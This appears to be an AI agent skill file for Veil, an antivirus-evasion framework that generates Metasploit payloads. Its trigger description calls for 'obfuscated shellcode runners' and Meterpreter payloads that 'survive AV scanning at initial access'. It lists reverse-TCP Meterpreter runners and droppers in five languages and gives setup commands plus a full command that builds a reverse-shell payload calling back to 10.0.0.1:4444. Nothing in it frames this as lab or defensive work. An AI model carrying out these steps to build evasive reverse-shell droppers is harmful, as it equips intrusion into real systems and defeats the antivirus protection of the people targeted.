---
name: veil
description: >
  This skill should be used when the user asks about "veil", "generating
  obfuscated shellcode runners", "embedding Meterpreter payloads that survive
  AV scanning at initial access". AV evasion framework generating
  Metasploit-compatible payloads in multiple languages (Python, Ruby, Go, C#,
  PowerShell) to bypass common antivirus.
---

# Veil

AV evasion payload generator for Metasploit.

## Quick Start

```bash
git clone https://github.com/Veil-Framework/Veil && cd Veil && ./config/setup.sh
./Veil.py
./Veil.py --list-tools
```

## Key Evasion Payloads

| Payload | Language |
|---------|----------|
| `python/meterpreter/rev_tcp` | Python shellcode runner |
| `ruby/meterpreter/rev_tcp` | Ruby runner |
| `powershell/meterpreter/rev_tcp` | PowerShell runner |
| `cs/meterpreter/rev_tcp` | C# compiled dropper |
| `go/meterpreter/rev_tcp` | Go-compiled runner |

## Generate a Payload

```bash
./Veil.py -t Evasion --payload python/meterpreter/rev_tcp \
  --ip 10.0.0.1 --port 4444 --output veil_payload
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Full payload list, obfuscation techniques |
